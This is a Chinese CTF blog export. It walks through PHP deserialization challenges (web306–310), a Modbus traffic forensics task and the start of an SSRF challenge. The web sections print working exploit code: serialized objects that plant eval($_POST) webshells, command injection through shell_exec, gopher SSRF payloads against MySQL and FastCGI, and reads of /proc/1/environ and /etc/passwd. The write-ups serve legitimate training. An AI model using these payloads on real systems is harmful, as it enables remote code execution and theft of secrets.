<span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;conn = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">log</span>();<br>    &#125;<br>&#125;<br><span class="hljs-variable">$d</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">dao</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">dao</span>()));<br><br><br>TzozOiJkYW8iOjE6e3M6OToiAGRhbwBjb25uIjtPOjM6ImxvZyI6Mjp7czo1OiJ0aXRsZSI7czo1OiIxLnBocCI7czo0OiJpbmZvIjtzOjI0OiI8P3BocCBldmFsKCRfUE9TVFsxXSk7Pz4iO319<br></code></pre></td></tr></table></figure><p>传参：</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305222343404.png" alt="image-20230522234331310"></p><p>蚁剑连接拿flag</p><h3 id="web307"><a href="#web307" class="headerlink" title="web307"></a>web307</h3><p>这一题不会调用那个方法了，我们放弃</p><p>dao.php中出现可以命令执行的利用点：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">dao</span></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$config</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$conn</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;config=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">config</span>();<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">init</span>();<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">clearCache</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&#x27;rm -rf ./&#x27;</span>.<span class="hljs-variable">$this</span>-&gt;config-&gt;cache_dir.<span class="hljs-string">&#x27;/*&#x27;</span>);<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>config.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">config</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$cache_dir</span> = <span class="hljs-string">&#x27;cache&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在logout.php中可以利用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$service</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;service&#x27;</span>]));<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$service</span>)&#123;<br><span class="hljs-variable">$service</span>-&gt;<span class="hljs-title function_ invoke__">clearCache</span>();<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p> 构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">config</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$cache_dir</span> = <span class="hljs-string">&#x27;;echo  &quot;&lt;?php eval(\$_POST[1]);?&gt;&quot; &gt;a.php;&#x27;</span>;<span class="hljs-comment">//linux的shell里面$有特殊意义所以转义一下。</span><br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">dao</span></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$config</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;config=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">config</span>();<br>&#125;<br><br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">dao</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><h3 id="web308"><a href="#web308" class="headerlink" title="web308"></a>web308</h3><blockquote><p>需要拿shell</p></blockquote><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305230955633.png" alt="image-20230523095520572"></p><p>这一题<code>clearCache()</code>过滤了很多，我们放弃</p><p>我们在<code>fun.php</code>中发现：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkUpdate</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span>&#123;<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>();<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-literal">false</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-literal">true</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="hljs-literal">true</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="hljs-literal">false</span>); <br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_SSL_VERIFYHOST, <span class="hljs-literal">false</span>);<br><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>curl</code>存在<code>ssrf漏洞</code></p><p>然后该函数被：<code>dao.php</code>  <code>checkVersion()</code>函数调用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkVersion</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">checkUpdate</span>(<span class="hljs-variable">$this</span>-&gt;config-&gt;update_url);<br>&#125;<br></code></pre></td></tr></table></figure><p>然后 该函数又在<code>index.php</code>中被调用：</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305231001073.png" alt="image-20230523100129016"></p><p>就形成了一条pop链</p><p>然后我们看到 <code>config.php</code>中：</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305231005502.png" alt="image-20230523100547456"></p><p>使用mysql数据库，用户名：root，又<strong>没有密码</strong>，</p><p>所以我们可以使用<strong>ssrf利用gopher协议打mysql去写入木马</strong>。我们使用 <code>Gopherus</code>：</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305231012902.png" alt="image-20230523101234818"></p><p>然后构造脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">dao</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$config</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;config = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">config</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">config</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$update_url</span> = <span class="hljs-string">&#x27;gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%46%00%00%00%03%73%65%6c%65%63%74%20%27%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%27%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%61%2e%70%68%70%27%3b%01%00%00%00%01&#x27;</span>;<br>&#125;<br><br><br><span class="hljs-variable">$d</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">dao</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$d</span>));<br><br></code></pre></td></tr></table></figure><p>cookie传参：</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305231013214.png" alt="image-20230523101313170"></p><p>命令执行即可：</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305231013545.png" alt="image-20230523101344498"></p><h3 id="web309"><a href="#web309" class="headerlink" title="web309"></a>web309</h3><blockquote><p>需要拿shell，308的方法不行了,mysql 有密码了</p></blockquote><p>由于mysql有密码了，</p><p><strong>SSRF利用gopher协议打mysql数据库是只能在无密码的情况下进行</strong>的，所以上题的方法失效了</p><p>不能打<code>mysql</code>，那我们只能测试一下<code>redis</code>和<code>fastcgi</code>，由于我们使用的是<code>mysql</code></p><p>所以只需测试<code>fastcgi</code>即可</p><blockquote><p>一般来说 FastCGI 都是绑定在 127.0.0.1 端口上的，但是利用 Gopher+SSRF 可以完美攻击 FastCGI 执行任意命令</p></blockquote><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">FastCGI</span>攻击需要满足三个条件：<br><span class="hljs-attribute">1</span>. PHP版本要高于<span class="hljs-number">5</span>.<span class="hljs-number">3</span>.<span class="hljs-number">3</span>，才能动态修改PHP.INI配置文件<br><span class="hljs-attribute">2</span>. 知道题目环境中的一个PHP文件的绝对路径<br><span class="hljs-attribute">3</span>.PHP-FPM监听在本机<span class="hljs-number">9000</span>端口<br></code></pre></td></tr></table></figure><p>使用<code>gopherus</code>脚本利用<code>fastcgi</code>，我们需要知道服务器上存在的一个文件(最好是php)</p><blockquote><p><strong>在安装完php后会存在一个自带php文件</strong>： <code>/usr/local/lib/php/PEAR.php</code> </p><p><code>/usr/local/lib/php/PEAR.php</code> 是一个文件路径，指向位于 Unix-like 系统中的 PHP PEAR（PHP Extension and Application Repository）库的文件。</p><p>PEAR 是一个第三方的 PHP 库和软件包管理系统，用于在 PHP 中方便地安装、升级和管理可重用的代码库。<code>PEAR.php</code> 文件是 PEAR 库的核心文件之一，它提供了用于加载和使用 PEAR 功能的函数和类。</p><p>通过包含 <code>PEAR.php</code> 文件，开发人员可以使用 PEAR 提供的功能和组件，例如自动加载类、安装和管理软件包、错误处理和日志记录等。它是 PEAR 库的入口点之一，其他的核心文件和组件也会在需要时被加载。</p><p>需要注意的是，<code>/usr/local/lib/php/PEAR.php</code> 是一个默认的路径示例，实际安装 PEAR 库的路径可能会有所不同，具体取决于系统和安装设置。</p></blockquote><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305231256133.png" alt="image-20230523125606024"></p><p>使用<strong>sleep命令</strong>测试一下存在延迟，</p><p>经过测试，存在延迟，所以我们可以利用fastcgi去执行命令</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305231259098.png" alt="image-20230523125919040"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">dao</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$config</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;config = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">config</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">config</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$update_url</span> = <span class="hljs-string">&#x27;gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F6%06%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH58%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%3A%04%00%3C%3Fphp%20system%28%27tac%20f%2A%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00&#x27;</span>;<br>&#125;<br><br><br><span class="hljs-variable">$d</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">dao</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$d</span>));<br><br><br></code></pre></td></tr></table></figure><p>然后传参</p><h3 id="web310"><a href="#web310" class="headerlink" title="web310"></a>web310</h3><p>经过测试，fastcgi的端口9000还是开放的，可以延迟，但是我们却读取不出flag了</p><p>我们先查找一下flag的路径：</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305231320954.png" alt="image-20230523132016898"></p><p>发现flag在 <code>/var/flag</code> 下：</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305231320211.png" alt="image-20230523132044162"></p><p>但是我们去读取还是读不出来</p><blockquote><p><code>nginx.conf</code> 和 FastCGI 在 Nginx 中有密切的关系。下面是它们之间的关系解释：</p><ol><li><p><strong>Nginx 配置文件 (<code>nginx.conf</code>)：</strong> <code>nginx.conf</code> 是 Nginx 的主配置文件，用于定义服务器的行为和功能。在 <code>nginx.conf</code> 文件中，可以配置 Nginx 服务器的全局设置、虚拟主机配置、代理规则、缓存设置等。这个文件是 Nginx 的核心配置文件，决定了服务器的整体行为。</p></li><li><p><strong>FastCGI：</strong> FastCGI 是一种用于处理动态内容的通信协议。它允许 Web 服务器（如 Nginx）与后端应用程序（如 PHP、Python、Ruby 等）进行通信。FastCGI 帮助提高服务器性能，通过长连接、进程管理和请求复用等机制，减少了每个请求启动新进程的开销。</p></li><li><p><strong>Nginx 与 FastCGI：</strong> Nginx 作为一个高性能的 Web 服务器，常用于代理和反向代理后端的 FastCGI 应用程序。当 Nginx 接收到来自客户端的请求时，它可以通过配置将请求转发给 FastCGI 后端，由 FastCGI 进程处理动态内容的生成。通过 Nginx 和 FastCGI 的结合，可以有效地处理动态请求，并将静态和动态内容进行分离，提高服务器的性能和可扩展性。</p></li></ol><p>在 <code>nginx.conf</code> 文件中，你可以使用 <code>location</code> 块来配置 Nginx 如何处理 FastCGI 请求。例如，你可以指定 FastCGI 后端的地址和端口、请求超时时间、缓存策略等。通过这些配置，Nginx 将能够将动态请求转发给 FastCGI 后端，并将响应返回给客户端。</p><p>总结来说，<code>nginx.conf</code> 是 Nginx 的主配置文件，定义了服务器的行为和功能，而 FastCGI 是一种通信协议，用于处理动态内容。Nginx 可以通过配置文件与 FastCGI 后端进行通信，实现动态内容的处理和分发。</p></blockquote><p>这里我们可以先读取一下 nginx 服务器配置文件：<code>nginx.conf</code></p><p>我们先查找一下路径：</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305231324652.png" alt="image-20230523132415592"></p><p>发现在：<code>/etc/nginx/nginx.conf</code> 路径下</p><p>于是我们读取它：</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305231324342.png" alt="image-20230523132451284"></p><p>nginx.conf</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs nginx">...<br><br><span class="hljs-section">http</span> &#123;<br>    <span class="hljs-attribute">include</span>       /etc/nginx/mime.types;<br>    <span class="hljs-attribute">default_type</span>  application/octet-stream;<br>    <span class="hljs-attribute">sendfile</span>        <span class="hljs-literal">on</span>;<br>    <span class="hljs-attribute">keepalive_timeout</span>  <span class="hljs-number">65</span>;<br><br>    ...<br>        <br>    <span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span>       <span class="hljs-number">4476</span>;<br>        <span class="hljs-attribute">server_name</span>  localhost;<br>        <span class="hljs-attribute">root</span>         /var/flag;<br>        <span class="hljs-attribute">index</span> index.html;<br><br>        <span class="hljs-attribute">proxy_set_header</span> Host <span class="hljs-variable">$host</span>;<br>        <span class="hljs-attribute">proxy_set_header</span> X-Real-IP <span class="hljs-variable">$remote_addr</span>;<br>        <span class="hljs-attribute">proxy_set_header</span> X-Forwarded-For <span class="hljs-variable">$proxy_add_x_forwarded_for</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在nginx配置文件中，我们发现，配置了端口为 4476 的http服务，并且该服务的根目录为：<code>/var/flag</code></p><p>因此，我们可以直接构造一个http请求，去请求本机的4476端口：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">dao</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$config</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;config = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">config</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">config</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$update_url</span> = <span class="hljs-string">&#x27;http://127.0.0.1:4476&#x27;</span>;<br>&#125;<br><br><br><span class="hljs-variable">$d</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">dao</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$d</span>));<br><br><br></code></pre></td></tr></table></figure><p>传参得flag</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>被加密的生产流量</title>
    <link href="/2023/08/24/%E8%A2%AB%E5%8A%A0%E5%AF%86%E7%9A%84%E7%94%9F%E4%BA%A7%E6%B5%81%E9%87%8F/"/>
    <url>/2023/08/24/%E8%A2%AB%E5%8A%A0%E5%AF%86%E7%9A%84%E7%94%9F%E4%BA%A7%E6%B5%81%E9%87%8F/</url>
    
    <content type="html"><![CDATA[<h2 id="CISCN2023-被加密的生产流量"><a href="#CISCN2023-被加密的生产流量" class="headerlink" title="[CISCN2023]被加密的生产流量"></a>[CISCN2023]被加密的生产流量</h2><blockquote><p>某安全部门发现某涉密工厂生产人员偷偷通过生产网络传输数据给不明人员，通过技术手段截获出一段通讯流量，但是其中的关键信息被进行了加密，请你根据流量包的内容，找出被加密的信息。（得到的字符串需要以flag{xxx}形式提交）</p></blockquote><p>得到一个<code>modbus.pcap</code>流量包</p><p>该开始我们先根据modbus进行分析，参考文章：<a href="https://xz.aliyun.com/t/5960">Modbus协议分析</a></p><p>使用脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf-8 -*-</span><br><span class="hljs-comment"># @Time : 2023/5/27 9:50</span><br><span class="hljs-comment"># @Author : Leekos</span><br><span class="hljs-comment"># @File : 被加密的生产流量.py</span><br><span class="hljs-comment"># @Software : PyCharm</span><br><span class="hljs-keyword">import</span> pyshark<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_code</span>():<br>     captures = pyshark.FileCapture(<span class="hljs-string">&quot;modbus.pcap&quot;</span>)<br>     func_codes = &#123;&#125;<br>     <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> captures:<br>         <span class="hljs-keyword">for</span> pkt <span class="hljs-keyword">in</span> c:<br>             <span class="hljs-keyword">if</span> pkt.layer_name == <span class="hljs-string">&quot;modbus&quot;</span>:<br>                 func_code = <span class="hljs-built_in">int</span>(pkt.func_code)<br>                 <span class="hljs-keyword">if</span> func_code <span class="hljs-keyword">in</span> func_codes:<br>                     func_codes[func_code] += <span class="hljs-number">1</span><br>                 <span class="hljs-keyword">else</span>:<br>                     func_codes[func_code] = <span class="hljs-number">1</span><br>     <span class="hljs-built_in">print</span>(func_codes)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br> get_code()<br></code></pre></td></tr></table></figure><p>分析出：</p><p><img src="https://s2.loli.net/2023/05/29/gMyTnhl2H19bYOF.png" alt="image-20230529100338650"></p><p>功能码为6（代表预置单个寄存器）的modbus协议数据包有16个，很可疑，于是我们使用wireshark过滤：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">modbus.func_code</span> == <span class="hljs-number">6</span> &amp;&amp; modbus.request_frame<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/05/29/3lNdp8rF4AL6mVD.png" alt="image-20230529100743080"></p><p>这个Data的值好像有用，16进制，我们将这些data拼接起来，16进制转字符串，无效：</p><p><img src="https://s2.loli.net/2023/05/29/WGhLAQtHmdCxbkr.png" alt="image-20230529100856821"></p><p>后来在tcp流中发现base32编码：</p><p><img src="https://s2.loli.net/2023/05/29/4WZP7jUH8ACObvE.png" alt="image-20230529100929110"></p><p>base32解码：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">MMYWMX3GNEYWOXZRGAYDA</span><span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure><p>得到flag</p><p><img src="https://s2.loli.net/2023/05/29/WHJvZhtMojYiQ7C.png" alt="image-20230529101032346"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>被加密的生产流量</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>YamiYami</title>
    <link href="/2023/08/24/YamiYami/"/>
    <url>/2023/08/24/YamiYami/</url>
    
    <content type="html"><![CDATA[<h4 id="YamiYami"><a href="#YamiYami" class="headerlink" title="YamiYami"></a>YamiYami</h4><p>进入题目：</p><p><img src="https://s2.loli.net/2023/04/23/nJmBkxYw3PaOfrF.png" alt="image-20230423143948531"></p><p>当我们点击 <code>Read somethings</code>时：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>node2.anna.nssctf.cn:<span class="hljs-number">28523</span><span class="hljs-regexp">/read?url=https:/</span><span class="hljs-regexp">/baidu.com</span><br></code></pre></td></tr></table></figure><p>我们发现可以读取到百度首页的内容，这是<strong>SSRF</strong>（突然忘记了）</p><p>python中我们可以使用 <code>file伪协议</code>读取文件内容</p><p>我们尝试一下读取 <code>/etc/passwd</code></p><p><img src="https://s2.loli.net/2023/04/23/gQ8YnFWyh2HAJak.png" alt="image-20230423144508490"></p><p>成功读取</p><p>非预期解：（直接读取环境变量）</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/proc/</span><span class="hljs-number">1</span>/environ   <span class="hljs-comment"># 这里读的是pid为1的进程</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/04/23/agHbZnvudWrm6to.png" alt="image-20230423144607816"></p><p>如果读取当前进程的环境变量是读取不到的：</p><p><img 